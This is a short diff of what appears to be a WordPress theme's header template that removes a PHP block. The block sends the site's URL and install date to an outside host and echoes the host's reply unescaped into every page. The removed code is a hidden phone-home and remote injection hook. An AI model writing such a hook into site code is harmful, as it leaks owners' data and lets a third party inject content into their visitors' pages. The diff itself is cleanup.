@@ -26,10 +26,6 @@
 	</head>
 
 	<body>
-		<?php 
-			$credit_text2 = file_get_contents("http://www.wordpresstemplates.com/form_work2/?url=".get_bloginfo('url')."&installed=".get_option("template_install_date"));
-			echo $credit_text2;		
-		?>
 		<div id="page"><div id="frame">
 			<div id="topbanner">
 
